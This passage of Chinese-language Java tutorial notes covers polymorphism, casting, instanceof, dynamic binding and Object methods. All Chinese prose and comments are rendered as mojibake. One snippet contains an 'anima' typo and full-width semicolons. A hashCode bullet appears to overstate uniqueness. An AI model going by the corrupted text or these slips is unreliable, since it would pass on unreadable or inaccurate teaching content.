}\n}\n\nclass Fish extends Food {\n    public Fish(String name) {\n        super(name);\n    }\n}\n```\n\nå¸¦æ¥çš„é—®é¢˜ï¼š\n\n- å¦‚æœåŠ¨ç‰©å¾ˆå¤šï¼Œé£Ÿç‰©å¾ˆå¤šï¼Œfeed æ–¹æ³•å¾ˆå¤šï¼Œä¸åˆ©äºç®¡ç†å’Œç»´æŠ¤\n- ä»£ç çš„å¤ç”¨æ€§ä¸é«˜ï¼Œè€Œä¸”ä¸åˆ©äºä»£ç ç»´æŠ¤\n\nè§£å†³æ–¹æ¡ˆï¼š é‡‡ç”¨å¤šæ€è§£å†³\n\n```java\npublic class Poly_ {\n    public static void main(String[] args) {\n        Master tom = new Master(\"Tom\");\n        Dog jack = new Dog(\"jack\");\n        Cat jerry = new Cat(\"jerry\");\n        Bone bone = new Bone(\"å¤§éª¨å¤´\");\n        Fish fish = new Fish(\"å°é±¼\");\n\n        tom.feed(jack,bone);\n        tom.feed(jerry,fish);\n\n    }\n\n}\nclass Master {\n    private String name;\n    public Master(String name) {\n        this.name = name;\n    }\n    //ä½¿ç”¨å¤šæ€æœºåˆ¶ï¼Œå¯ä»¥ç»Ÿä¸€çš„ç®¡ç†ä¸»äººå–‚é£Ÿçš„é—®é¢˜\n\t\t//animal ç¼–è¯‘ç±»å‹æ˜¯Animal,å¯ä»¥æŒ‡å‘(æ¥æ”¶) Animal å­ç±»çš„å¯¹è±¡\n\t\t//food ç¼–è¯‘ç±»å‹æ˜¯Food ,å¯ä»¥æŒ‡å‘(æ¥æ”¶) Food å­ç±»çš„å¯¹è±¡\n    public void feed(Animal animal, Food food) {\n        System.out.println(\"ä¸»äºº\" + name + \" ç»™\" + animal.getName() + \" åƒ\" + food.getName());\n    }\n}\n\nclass Animal {\n    private String name;\n    public Animal(String name) {\n        this.name = name;\n    }\n    public String getName() {\n        return name;\n    }\n}\n\nclass Dog extends Animal {\n    public Dog(String name) {\n        super(name);\n    }\n}\n\nclass Cat extends Animal {\n    public Cat(String name) {\n        super(name);\n    }\n}\n\nclass Food {\n    private String name;\n    public Food(String name) {\n        this.name = name;\n    }\n    public String getName() {\n        return name;\n    }\n}\n\nclass Bone extends Food {\n    public Bone(String name) {\n        super(name);\n    }\n}\n\nclass Fish extends Food {\n    public Fish(String name) {\n        super(name);\n    }\n}\n```\n\n#### å¤šæ€ä»‹ç»\n\næ–¹æ³•æˆ–å¯¹è±¡å…·æœ‰å¤šç§å½¢æ€ã€‚æ˜¯é¢å‘å¯¹è±¡çš„ç¬¬ä¸‰å¤§ç‰¹å¾ï¼Œå¤šæ€æ˜¯å»ºç«‹åœ¨å°è£…å’Œç»§æ‰¿åŸºç¡€ä¹‹ä¸Šçš„ã€‚\n\n- é‡è½½å’Œé‡å†™éƒ½ä½“ç°äº†å¤šæ€\n\n- ä¸€ä¸ªå¯¹è±¡çš„ç¼–è¯‘ç±»å‹å’Œè¿è¡Œç±»å‹å¯ä»¥ä¸ä¸€è‡´\n\n- ç¼–è¯‘ç±»å‹åœ¨å®šä¹‰å¯¹è±¡æ—¶ï¼Œå°±ç¡®å®šäº†ï¼Œä¸èƒ½æ”¹å˜\n\n- è¿è¡Œç±»å‹æ˜¯å¯ä»¥å˜åŒ–çš„\n\n- ç¼–è¯‘ç±»å‹çœ‹å®šä¹‰æ—¶=å·çš„å·¦è¾¹ï¼Œè¿è¡Œç±»å‹çœ‹=å·çš„å³è¾¹\n\n  ```java\n  Animal animal = new Dog()ï¼›//animalç¼–è¯‘ç±»å‹æ˜¯Animal,è¿è¡Œç±»å‹Dog\n  animal = new Cat(); //animalçš„è¿è¡Œç±»å‹å˜æˆäº†Cat, ç¼–è¯‘ç±»å‹ä»ç„¶æ˜¯Animal\n  ```\n\n- å¤šæ€çš„å‰ææ˜¯ï¼šä¸¤ä¸ªå¯¹è±¡(ç±»)å­˜åœ¨ç»§æ‰¿å…³ç³»\n\n#### å¤šæ€çš„å‘ä¸Šè½¬å‹\n\n- 1)æœ¬è´¨ï¼šçˆ¶ç±»çš„å¼•ç”¨æŒ‡å‘äº†å­ç±»çš„å¯¹è±¡\n\n- 2)è¯­æ³•ï¼šçˆ¶ç±»ç±»å‹ å¼•ç”¨å = new å­ç±»ç±»å‹();\n\n  - ```java\n    Animal animal = new Dog()ï¼›\n    ```\n\n- 3)ç‰¹ç‚¹ï¼šç¼–è¯‘ç±»å‹çœ‹å·¦è¾¹ï¼Œè¿è¡Œç±»å‹çœ‹å³è¾¹\n\n  - å¯ä»¥è°ƒç”¨çˆ¶ç±»ä¸­çš„æ‰€æœ‰æˆå‘˜(éœ€éµå®ˆè®¿é—®æƒé™)\n  - ä¸èƒ½è°ƒç”¨å­ç±»ä¸­ç‰¹æœ‰æˆå‘˜(å±æ€§/æ–¹æ³•)\n  - æœ€ç»ˆè¿è¡Œæ•ˆæœçœ‹å­ç±»çš„å…·ä½“å®ç°\n\n```java\npublic class PolyDetail {\n    public static void main(String[] args) {\n        //å‘ä¸Šè½¬å‹: çˆ¶ç±»çš„å¼•ç”¨æŒ‡å‘äº†å­ç±»çš„å¯¹è±¡\n        Animal_ animal = new Cat_();\n      \n        //å¯ä»¥è°ƒç”¨çˆ¶ç±»ä¸­çš„æ‰€æœ‰æˆå‘˜(éœ€éµå®ˆè®¿é—®æƒé™)\n        animal.eat();//åƒ\n        animal.sleep();//ç¡\n      \n        //ä¸èƒ½è°ƒç”¨å­ç±»ä¸­ç‰¹æœ‰æˆå‘˜(å±æ€§/æ–¹æ³•)\n        animal.catchMouse();//é”™è¯¯å†™æ³•\n    }\n}\n\nclass Animal_ {\n    String name = \"åŠ¨ç‰©\";\n    int age = 10;\n    public void sleep(){\n        System.out.println(\"ç¡\");\n    }\n    public void eat(){\n        System.out.println(\"åƒ\");\n    }\n}\n\nclass Cat_ extends Animal_ {\n    @Override\n    public void eat(){//æ–¹æ³•é‡å†™\n        System.out.println(\"çŒ«åƒé±¼\");\n    }\n    public void catchMouse(){//Cat ç‰¹æœ‰æ–¹æ³•\n        System.out.println(\"çŒ«æŠ“è€é¼ \");\n    }\n}\n```\n\n#### å¤šæ€çš„å‘ä¸‹è½¬å‹\n\n- 1)è¯­æ³•ï¼šå­ç±»ç±»å‹å¼•ç”¨å = (å­ç±»ç±»å‹) çˆ¶ç±»å¼•ç”¨;\n\n  - ```java\n    Dog dog = (Dog) animalï¼›\n    ```\n\n- 2)åªèƒ½å¼ºè½¬çˆ¶ç±»çš„å¼•ç”¨ï¼Œä¸èƒ½å¼ºè½¬çˆ¶ç±»çš„å¯¹è±¡\n\n- 3)è¦æ±‚çˆ¶ç±»çš„å¼•ç”¨å¿…é¡»æŒ‡å‘çš„æ˜¯å½“å‰ç›®æ ‡ç±»å‹çš„å¯¹è±¡\n\n- 4)å½“å‘ä¸‹è½¬å‹åï¼Œå¯ä»¥è°ƒç”¨å­ç±»ç±»å‹ä¸­æ‰€æœ‰çš„æˆå‘˜\n\n```java\npublic class PolyDetail {\n    public static void main(String[] args) {\n        Animal_ animal = new Cat_();\n       //å‘ä¸‹è½¬å‹ï¼šå¸Œæœ›å¯ä»¥è°ƒç”¨Catçš„catchMouse æ–¹æ³•\n        Cat_ cat = (Cat_) anima;\n        cat.eat();//åƒ\n        cat.sleep();//ç¡\n        cat.catchMouse();//ç‰¹æœ‰æ–¹æ³•ä¹Ÿå¯è°ƒç”¨\n      \n        //è¦æ±‚çˆ¶ç±»çš„å¼•ç”¨å¿…é¡»æŒ‡å‘çš„æ˜¯å½“å‰ç›®æ ‡ç±»å‹çš„å¯¹è±¡\n        Dog dog = (Dog) animal; //é”™è¯¯å†™æ³•\n    }\n}\n\nclass Animal_ {\n    String name = \"åŠ¨ç‰©\";\n    int age = 10;\n    public void sleep(){\n        System.out.println(\"ç¡\");\n    }\n    public void eat(){\n        System.out.println(\"åƒ\");\n    }\n}\n\nclass Cat_ extends Animal_ {\n    @Override\n    public void eat(){//æ–¹æ³•é‡å†™\n        System.out.println(\"çŒ«åƒé±¼\");\n    }\n    public void catchMouse(){//Cat ç‰¹æœ‰æ–¹æ³•\n        System.out.println(\"çŒ«æŠ“è€é¼ \");\n    }\n}\n\nclass Dog_ extends Animal_ {//Dog æ˜¯Animal çš„å­ç±»\n}\n```\n\n#### å±æ€§é‡å†™é—®é¢˜\n\nå±æ€§æ²¡æœ‰é‡å†™ä¹‹è¯´ï¼å±æ€§çš„å€¼çœ‹ç¼–è¯‘ç±»å‹\n\n```java\npublic class PolyDetail02 {\n\t\tpublic static void main(String[] args) {\n        //å±æ€§æ²¡æœ‰é‡å†™ä¹‹è¯´ï¼å±æ€§çš„å€¼çœ‹ç¼–è¯‘ç±»å‹\n        Base base = new Sub();//å‘ä¸Šè½¬å‹\n        System.out.println(base.count);//çœ‹ç¼–è¯‘ç±»å‹10\n\n        Sub sub = new Sub();\n        System.out.println(sub.count);//20\n   }\n}\nclass Base { //çˆ¶ç±»\n\t\tint count = 10;//å±æ€§\n}\nclass Sub extends Base {//å­ç±»\n\t\tint count = 20;//å±æ€§\n}\n```\n\n#### instanceOf \n\nç”¨äºåˆ¤æ–­å¯¹è±¡çš„**è¿è¡Œç±»å‹**æ˜¯å¦ä¸ºXX ç±»å‹æˆ–XX ç±»å‹çš„å­ç±»å‹\n\n```java\npublic class PolyDetail03 {\n      public static void main(String[] args) {\n          BB bb = new BB();\n          System.out.println(bb instanceof BB);//true\n          System.out.println(bb instanceof AA);//true\n          \n          //BB æ˜¯AA å­ç±»\n          AA aa = new BB(); //aa ç¼–è¯‘ç±»å‹AA, è¿è¡Œç±»å‹æ˜¯BB\n          System.out.println(aa instanceof AA);//true\n          System.out.println(aa instanceof BB);//true\n        \n          Object obj = new Object();\n          System.out.println(obj instanceof AA);//false\n        \n          String str = \"hello\";\n          System.out.println(str instanceof Object);//true\n    }\n}\nclass AA {} //çˆ¶ç±»\nclass BB extends AA {}//å­ç±»\n```\n\n#### åŠ¨æ€ç»‘å®šæœºåˆ¶\n\n- å½“è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„æ—¶å€™ï¼Œè¯¥æ–¹æ³•ä¼šå’Œè¯¥å¯¹è±¡çš„è¿è¡Œç±»å‹(å†…å­˜åœ°å€)ç»‘å®š\n- å½“è°ƒç”¨å¯¹è±¡å±æ€§æ—¶ï¼Œæ²¡æœ‰åŠ¨æ€ç»‘å®šæœºåˆ¶ï¼Œå“ªé‡Œå£°æ˜ï¼Œé‚£é‡Œä½¿ç”¨\n\n```java\npublic class DynamicBinding {\n    public static void main(String[] args) {\n        //a çš„ç¼–è¯‘ç±»å‹A, è¿è¡Œç±»å‹B\n        A a = new B();//å‘ä¸Šè½¬å‹\n        //è¿è¡Œç±»å‹æ˜¯Bï¼Œå…ˆæ‰¾Bç±»é‡Œæ˜¯å¦æœ‰sumï¼Œæœ‰å°±ç›´æ¥è¿è¡Œ\n        System.out.println(a.sum());//40 è°ƒç”¨å­ç±»sum\n        System.out.println(a.sum1());//30 è°ƒç”¨å­ç±»sum1\n    }\n}\nclass A {//çˆ¶ç±»\n    public int i = 10;\n    public int sum() {//çˆ¶ç±»sum()\n        return getI() + 10;\n    }\n    public int sum1() {//çˆ¶ç±»sum1()\n        return i + 10;\n    }\n    public int getI() {//çˆ¶ç±»getI\n        return i;\n    }\n}\nclass B extends A {//å­ç±»\n    public int i = 20;\n\n     @Override\n     public int sum() {\n         return i + 20;\n     }\n\n    @Override\n    public int getI() {//å­ç±»getI()\n        return i;\n    }\n\n     @Override\n     public int sum1() {\n        return i + 10;\n     }\n}\n```\n\n\n\n```java\npublic class DynamicBinding {\n    public static void main(String[] args) {\n        //a çš„ç¼–è¯‘ç±»å‹A, è¿è¡Œç±»å‹B\n        A a = new B();//å‘ä¸Šè½¬å‹ \n        //è¿è¡Œç±»å‹æ˜¯Bï¼Œå…ˆæ‰¾Bç±»é‡Œæ˜¯å¦æœ‰sumï¼Œæ²¡æœ‰å°±å»çˆ¶ç±»æ‰¾\n        System.out.println(a.sum());//30 è°ƒç”¨çˆ¶ç±»sum å’Œå­ç±»getI\n        System.out.println(a.sum1());//20 è°ƒç”¨çˆ¶ç±»sum å’Œçˆ¶ç±»i\n    }\n}\nclass A {//çˆ¶ç±»\n    public int i = 10;\n    //åŠ¨æ€ç»‘å®šæœºåˆ¶\n    public int sum() {//çˆ¶ç±»sum()\n        return getI() + 10;//20 + 10\n    }\n    public int sum1() {//çˆ¶ç±»sum1()\n        return i + 10;//10 + 10\n    }\n    public int getI() {//çˆ¶ç±»getI\n        return i;\n    }\n}\nclass B extends A {//å­ç±»\n    public int i = 20;\n    @Override\n    public int getI() {//å­ç±»getI()\n        return i;\n    }\n}\n```\n\n#### å¤šæ€çš„åº”ç”¨\n\n#####  å¤šæ€æ•°ç»„\n\næ•°ç»„çš„å®šä¹‰ç±»å‹ä¸ºçˆ¶ç±»ç±»å‹ï¼Œé‡Œé¢ä¿å­˜çš„å®é™…å…ƒç´ ç±»å‹ä¸ºå­ç±»ç±»å‹\n\nåº”ç”¨å®ä¾‹:ç°æœ‰ä¸€ä¸ªç»§æ‰¿ç»“æ„å¦‚ä¸‹ï¼šè¦æ±‚åˆ›å»º1 ä¸ªPerson å¯¹è±¡ã€2 ä¸ªStudent å¯¹è±¡å’Œ2 ä¸ªTeacher å¯¹è±¡, ç»Ÿä¸€æ”¾åœ¨æ•°ç»„ä¸­ï¼Œå¹¶è°ƒç”¨æ¯ä¸ªå¯¹è±¡ say æ–¹æ³•ï¼Œå¦‚ä½•è°ƒç”¨å­ç±»ç‰¹æœ‰çš„æ–¹æ³•ï¼Œæ¯”å¦‚ Teacher æœ‰ä¸€ä¸ª teach , Student æœ‰ä¸€ä¸ª study\n\næ€ä¹ˆè°ƒç”¨ï¼Ÿ\n\n```java\npublic class PolyArray {\n    public static void main(String[] args) {\n        //åº”ç”¨å®ä¾‹:ç°æœ‰ä¸€ä¸ªç»§æ‰¿ç»“æ„å¦‚ä¸‹ï¼šè¦æ±‚åˆ›å»º1 ä¸ªPerson å¯¹è±¡ã€\n        // 2 ä¸ªStudent å¯¹è±¡å’Œ2 ä¸ªTeacher å¯¹è±¡, ç»Ÿä¸€æ”¾åœ¨æ•°ç»„ä¸­ï¼Œå¹¶è°ƒç”¨æ¯ä¸ªå¯¹è±¡say æ–¹æ³•\n        Person[] persons = new Person[5];\n        persons[0] = new Person(\"jack\", 20);\n        persons[1] = new Student(\"mary\", 18, 100);\n        persons[2] = new Student(\"smith\", 19, 30.1);\n        persons[3] = new Teacher(\"scott\", 30, 20000);\n        persons[4] = new Teacher(\"king\", 50, 25000);\n        //å¾ªç¯éå†å¤šæ€æ•°ç»„ï¼Œè°ƒç”¨say\n        for (int i = 0; i < persons.length; i++) {\n            //person[i] ç¼–è¯‘ç±»å‹æ˜¯Person ,è¿è¡Œç±»å‹æ˜¯æ˜¯æ ¹æ®å®é™…æƒ…å†µæœ‰JVM æ¥åˆ¤æ–­\n            System.out.println(persons[i].say());//åŠ¨æ€ç»‘å®šæœºåˆ¶\n            // ä½¿ç”¨ç±»å‹åˆ¤æ–­+ å‘ä¸‹è½¬å‹\n            if(persons[i] instanceof Student) {//åˆ¤æ–­person[i] çš„è¿è¡Œç±»å‹æ˜¯ä¸æ˜¯Student\n                Student student = (Student)persons[i];//å‘ä¸‹è½¬å‹\n                student.study();\n            //ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€æ¡è¯­å¥((Student)persons[i]).study();\n            } else if(persons[i] instanceof Teacher) {\n                Teacher teacher = (Teacher)persons[i];\n                teacher.teach();\n            } else if(persons[i] instanceof Person){\n            System.out.println(\"ä¸åšå¤„ç†...\");\n            } else {\n                System.out.println(\"ä½ çš„ç±»å‹æœ‰è¯¯, è¯·è‡ªå·±æ£€æŸ¥...\");\n            }\n        }\n    }\n\n}\nclass Person {//çˆ¶ç±»\n    private String name;\n    private int age;\n    public Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n    public String getName() {\n        return name;\n    }\n    public String say() {//è¿”å›åå­—å’Œå¹´é¾„\n        return name + \"\\t\" + age;\n    }\n}\n\nclass Student extends Person {\n    private double score;\n    public Student(String name, int age, double score) {\n        super(name, age);\n        this.score = score;\n    }\n    //é‡å†™çˆ¶ç±»say\n    @Override\n    public String say() {\n        return \"å­¦ç”Ÿ\" + super.say() + \" score=\" + score;\n    }\n    //ç‰¹æœ‰çš„æ–¹æ³•\n    public void study() {\n        System.out.println(\"å­¦ç”Ÿ\" + getName() + \" æ­£åœ¨å­¦java...\");\n    }\n}\n\n\nclass Teacher extends Person {\n    private double salary;\n    public Teacher(String name, int age, double salary) {\n        super(name, age);\n        this.salary = salary;\n    }\n    //å†™é‡å†™çˆ¶ç±»çš„say æ–¹æ³•\n    @Override\n    public String say() {\n        return \"è€å¸ˆ\" + super.say() + \" salary=\" + salary;\n    }\n    //ç‰¹æœ‰æ–¹æ³•\n    public void teach() {\n        System.out.println(\"è€å¸ˆ\" + getName() + \" æ­£åœ¨è®²java è¯¾ç¨‹...\");\n    }\n}\n```\n\n##### å¤šæ€å‚æ•°\n\næ–¹æ³•å®šä¹‰çš„å½¢å‚ç±»å‹ä¸ºçˆ¶ç±»ç±»å‹ï¼Œå®å‚ç±»å‹å…è®¸ä¸ºå­ç±»ç±»å‹\n\nåº”ç”¨å®ä¾‹: å®šä¹‰å‘˜å·¥ç±» Employeeï¼ŒåŒ…å«å§“åå’Œæœˆå·¥èµ„[private]ï¼Œä»¥åŠè®¡ç®—å¹´å·¥èµ„ getAnnual\nçš„æ–¹æ³•ã€‚æ™®é€šå‘˜å·¥å’Œç»ç†ç»§æ‰¿äº†å‘˜å·¥ï¼Œç»ç†ç±»å¤šäº†å¥–é‡‘ bonus å±æ€§å’Œç®¡ç† manage æ–¹æ³•ï¼Œæ™®é€šå‘˜å·¥ç±»å¤šäº† work æ–¹æ³•ï¼Œæ™®é€šå‘˜å·¥å’Œç»ç†ç±»è¦æ±‚åˆ†åˆ«é‡å†™ getAnnual æ–¹æ³•ï¼Œæµ‹è¯•ç±»ä¸­æ·»åŠ ä¸€ä¸ªæ–¹æ³• showEmpAnnual(Employee e)ï¼Œå®ç°è·å–ä»»ä½•å‘˜å·¥å¯¹è±¡çš„å¹´å·¥èµ„ï¼Œå¹¶åœ¨ main æ–¹æ³•ä¸­è°ƒç”¨è¯¥æ–¹æ³•[e.getAnnual()] æµ‹è¯•ç±»ä¸­æ·»åŠ ä¸€ä¸ªæ–¹æ³•ï¼ŒtestWorkï¼Œå¦‚æœæ˜¯æ™®é€šå‘˜å·¥ï¼Œ åˆ™è°ƒç”¨ work æ–¹æ³•ï¼Œå¦‚æœæ˜¯ç»\nç†ï¼Œåˆ™è°ƒç”¨ manageæ–¹æ³•\n\n```java\npublic class PolyParameter {\n    public static void main(String[] args) {\n        Worker tom = new Worker(\"tom\", 2500);\n        Manager milan = new Manager(\"milan\", 5000, 200000);\n        PolyParameter.showEmpAnnual(tom);\n        PolyParameter.showEmpAnnual(milan);\n        PolyParameter.testWork(tom);\n        PolyParameter.testWork(milan);\n    }\n\n    public static void showEmpAnnual(Employee e) {\n        System.out.println(e.getAnnual());\n    }\n\n    public static void testWork(Employee e) {\n        if (e instanceof Worker) {\n            ((Worker) e).work();//æœ‰å‘ä¸‹è½¬å‹æ“ä½œ\n        } else if (e instanceof Manager) {\n            ((Manager) e).manage();//æœ‰å‘ä¸‹è½¬å‹æ“ä½œ\n        } else {\n            System.out.println(\"ä¸åšå¤„ç†...\");\n        }\n    }\n}\n\nclass Employee {\n  private String name;\n  private double salary;\n\n  public Employee(String name, double salary) {\n    this.name = name;\n    this.salary = salary;\n  }\n\n  public String getName() {\n    return name;\n  }\n\n  public double getSalary() {\n    return salary;\n  }\n\n  public double getAnnual() {\n    return 12 * salary;\n  }\n}\n\nclass Worker extends Employee {\n  public Worker(String name, double salary) {\n    super(name, salary);\n  }\n\n  public void work() {\n    System.out.println(\"æ™®é€šå‘˜å·¥\" + getName() + \" is working\");\n  }\n\n  @Override\n  public double getAnnual() {\n    return super.getAnnual();\n  }\n}\n\nclass Manager extends Employee {\n  private double bonus;\n\n  public Manager(String name, double salary, double bonus) {\n    super(name, salary);\n    this.bonus = bonus;\n  }\n\n  public void manage() {\n    System.out.println(\"ç»ç†\" + getName() + \" is managing\");\n  }\n\n  @Override\n  public double getAnnual() {\n    return super.getAnnual() + bonus;\n  }\n}\n```\n\n\n\n### Objectç±»\n\n#### equals\n\nequals æ˜¯ Object ç±»ä¸­çš„æ–¹æ³•ï¼Œåªèƒ½åˆ¤æ–­å¼•ç”¨ç±»å‹ï¼Œé»˜è®¤åˆ¤æ–­çš„æ˜¯åœ°å€æ˜¯å¦ç›¸ç­‰ï¼Œå­ç±»ä¸­å¾€å¾€é‡å†™è¯¥æ–¹æ³•ï¼Œç”¨äºåˆ¤æ–­å†…å®¹æ˜¯å¦ç›¸ç­‰ã€‚æ¯”å¦‚ Integerï¼ŒString \n\n**== å’Œ equals çš„å¯¹æ¯”**\n\n- == æ˜¯ä¸€ä¸ªæ¯”è¾ƒè¿ç®—ç¬¦\n\n  - 1.æ—¢å¯ä»¥åˆ¤æ–­åŸºæœ¬ç±»å‹ï¼Œåˆå¯ä»¥åˆ¤æ–­å¼•ç”¨ç±»å‹\n\n  - 2.å¦‚æœåˆ¤æ–­åŸºæœ¬ç±»å‹ï¼Œåˆ¤æ–­çš„æ˜¯å€¼æ˜¯å¦ç›¸ç­‰ã€‚\n\n  - 3.å¦‚æœåˆ¤æ–­å¼•ç”¨ç±»å‹ï¼Œåˆ¤æ–­çš„æ˜¯åœ°å€æ˜¯å¦ç›¸ç­‰ï¼Œå³åˆ¤å®šæ˜¯ä¸æ˜¯åŒä¸€ä¸ªå¯¹è±¡\n\n- equals æ˜¯ Object ç±»ä¸­çš„æ–¹æ³•ï¼Œåªèƒ½åˆ¤æ–­å¼•ç”¨ç±»å‹ï¼Œé»˜è®¤åˆ¤æ–­çš„æ˜¯åœ°å€æ˜¯å¦ç›¸ç­‰\n\n**å¦‚ä½•é‡å†™ equals æ–¹æ³•**\n\nğŸŒ°ï¼šåˆ¤æ–­ä¸¤ä¸ª Person å¯¹è±¡çš„å†…å®¹æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœä¸¤ä¸ª Person å¯¹è±¡çš„å„ä¸ªå±æ€§å€¼éƒ½ä¸€æ ·ï¼Œåˆ™è¿”å›trueï¼Œåä¹‹false\n\n```java\npublic class EqualsExercise01 {\npublic static void main(String[] args) {\n    Person person1 = new Person(\"jack\", 10, 'ç”·');\n    Person person2 = new Person(\"jack\", 20, 'ç”·');\n    System.out.println(person1.equals(person2));//å‡\n\t}\n}\n//åˆ¤æ–­ä¸¤ä¸ªPerson å¯¹è±¡çš„å†…å®¹æ˜¯å¦ç›¸ç­‰ï¼Œ\n//å¦‚æœä¸¤ä¸ªPerson å¯¹è±¡çš„å„ä¸ªå±æ€§å€¼éƒ½ä¸€æ ·ï¼Œåˆ™è¿”å›trueï¼Œåä¹‹false\nclass Person{ //extends Object\n    private String name;\n    private int age;\n    private char gender;\n  \n\t\t//é‡å†™Object çš„equals æ–¹æ³•\n\t\tpublic boolean equals(Object obj) {\n      //åˆ¤æ–­å¦‚æœæ¯”è¾ƒçš„ä¸¤ä¸ªå¯¹è±¡æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œåˆ™ç›´æ¥è¿”å›true\n      if(this == obj) {\n      return true;\n      }\n      //ç±»å‹åˆ¤æ–­\n      if(obj instanceof Person) {//æ˜¯Personï¼Œæˆ‘ä»¬æ‰æ¯”è¾ƒ\n      \t\t//è¿›è¡Œå‘ä¸‹è½¬å‹, å› ä¸ºæˆ‘éœ€è¦å¾—åˆ°obj çš„å„ä¸ªå±æ€§\n          Person p = (Person)obj;\n          return this.name.equals(p.name) && this.age == p.age && this.gender == p.gender;\n      }\n      //å¦‚æœä¸æ˜¯Person ï¼Œåˆ™ç›´æ¥è¿”å›false\n      return false;\n    }\n  \n  \tpublic Person(String name, int age, char gender) {\n      this.name = name;\n      this.age = age;\n      this.gender = gender;\n    }\n}\n```\n\n#### hashCode\n\nè¿”å›è¯¥å¯¹è±¡çš„å“ˆå¸Œç å€¼ã€‚æ­¤æ–¹æ³•æ˜¯ä¸ºäº†æé«˜å“ˆå¸Œè¡¨çš„æ€§èƒ½ã€‚\n\n- ä¸¤ä¸ªå¼•ç”¨ï¼Œå¦‚æœæŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œåˆ™å“ˆå¸Œå€¼è‚¯å®šæ˜¯ä¸€æ ·çš„ï¼\n\n- ä¸¤ä¸ªå¼•ç”¨ï¼Œå¦‚æœæŒ‡å‘çš„æ˜¯ä¸åŒå¯¹è±¡ï¼Œåˆ™å“ˆå¸Œå€¼æ˜¯ä¸ä¸€æ ·çš„ã€‚\n\n- å“ˆå¸Œå€¼ä¸»è¦æ ¹æ®åœ°å€å·æ¥çš„ï¼ï¼Œä½†æ˜¯ ä¸èƒ½å®Œå…¨å°†å“ˆå¸Œå€¼ç­‰ä»·äºåœ°å€ã€‚\n- é›†åˆä¸­ hashCode å¦‚æœéœ€è¦çš„è¯ï¼Œä¹Ÿä¼šé‡å†™ã€‚\n\n####  toString\n\n- é»˜è®¤è¿”å›ï¼šå…¨ç±»å(åŒ…å+ç±»å)+@+å“ˆå¸Œå€¼çš„åå…­è¿›åˆ¶\n\n- å­ç±»å¾€å¾€é‡å†™toString æ–¹æ³•ï¼Œç”¨äºè¿”å›å¯¹è±¡çš„å±æ€§ä¿¡æ¯\n- é‡å†™ toString æ–¹æ³•ï¼Œæ‰“å°å¯¹è±¡æˆ–æ‹¼æ¥å¯¹è±¡æ—¶ï¼Œéƒ½ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥å¯¹è±¡çš„toString å½¢å¼\n- å½“ç›´æ¥è¾“å‡ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ toString æ–¹æ³•ä¼šè¢«é»˜è®¤çš„è°ƒç”¨\n  - æ¯”å¦‚System.out.println(monster) ï¼› å°±ä¼šé»˜è®¤è°ƒç”¨ monster.toString()\n\n#### finalize\n\nå½“å¯¹è±¡è¢«å›æ”¶æ—¶ï¼Œç³»ç»Ÿè‡ªåŠ¨è°ƒç”¨è¯¥å¯¹è±¡çš„ finalize æ–¹æ³•ã€‚å­ç±»å¯ä»¥é‡å†™è¯¥æ–¹æ³•ï¼Œåšä¸€äº›é‡Šæ”¾èµ„æºçš„æ“ä½œ\n\nä»€ä¹ˆæ—¶å€™è¢«å›æ”¶ï¼šå½“æŸä¸ªå¯¹è±¡æ²¡æœ‰ä»»ä½•å¼•ç”¨æ—¶ï¼Œåˆ™ jvm å°±è®¤ä¸ºè¿™ä¸ªå¯¹è±¡æ˜¯ä¸€ä¸ªåƒåœ¾å¯¹è±¡ï¼Œå°±ä¼šä½¿ç”¨åƒåœ¾å›æ”¶æœºåˆ¶æ¥é”€æ¯è¯¥å¯¹è±¡ï¼Œåœ¨é”€æ¯è¯¥å¯¹è±¡å‰ï¼Œä¼šå…ˆè°ƒç”¨finalize æ–¹æ³•ã€‚\n\nåƒåœ¾å›æ”¶æœºåˆ¶çš„è°ƒç”¨ï¼Œæ˜¯ç”±ç³»ç»Ÿæ¥å†³å®š(å³æœ‰è‡ªå·±çš„GC ç®—æ³•), ä¹Ÿå¯ä»¥é€šè¿‡System.gc() ä¸»åŠ¨è§¦å‘åƒåœ¾å›æ”¶æœºåˆ¶\n\n```java\npublic class Finalize_ {\n//å¦‚æœç¨‹åºå‘˜ä¸é‡å†™finalize,é‚£ä¹ˆå°±ä¼šè°ƒç”¨Objectç±»çš„finalize, å³é»˜è®¤å¤„ç†\n//å¦‚æœç¨‹åºå‘˜é‡å†™äº†finalize, å°±å¯ä»¥å®ç°è‡ªå·±çš„é€»è¾‘\n\t\tpublic static void main(String[] args) {\n\t\t\t\tCar bmw = new Car(\"å®é©¬\");\n      \t//è¿™æ—¶carå¯¹è±¡å°±æ˜¯ä¸€ä¸ªåƒåœ¾\n      \t//åƒåœ¾å›æ”¶å™¨å°±ä¼šå›æ”¶(é”€æ¯)å¯¹è±¡, \n      \t//åœ¨é”€æ¯å¯¹è±¡å‰ï¼Œä¼šè°ƒç”¨è¯¥å¯¹è±¡çš„finalize æ–¹æ³•\n      \tbmw = null;\n        System.gc();//ä¸»åŠ¨è°ƒç”¨åƒåœ¾å›æ”¶å™¨\n        System.out.println(\"ç¨‹åºé€€å‡ºäº†....\");\n\t\t}\n}\nclass Car {\n\t\tprivate String name;\n    public Car(String name) {\n    \t\tthis.name = name;\n    }\n\t\t//é‡å†™finalize\n    @Override\n    protected void finalize() throws Throwable {\n    \t\tSystem.out.println(\"æˆ‘ä»¬é”€æ¯æ±½è½¦\" + name );\n    \t\tSystem.out.println(\"é‡Šæ”¾äº†æŸäº›èµ„æº...\");\n    }\n}\n```\n\n## é¢å‘å¯¹è±¡-é«˜çº§\n\n###  ç±»å˜é‡(é™æ€å˜é‡)\n\n####  **ç±»å˜é‡ç®€ä»‹**\n\nç±»å˜é‡ï¼ˆåˆå«é™æ€å˜é‡ï¼‰æ˜¯`è¯¥ç±»çš„æ‰€æœ‰å¯¹è±¡å…±äº«çš„å˜é‡`ï¼Œä»»ä½•ä¸€ä¸ªè¯¥ç±»çš„å¯¹è±¡å»è®¿é—®å®ƒæ—¶ï¼Œå–åˆ°çš„éƒ½æ˜¯ç›¸åŒçš„å€¼ï¼ŒåŒæ 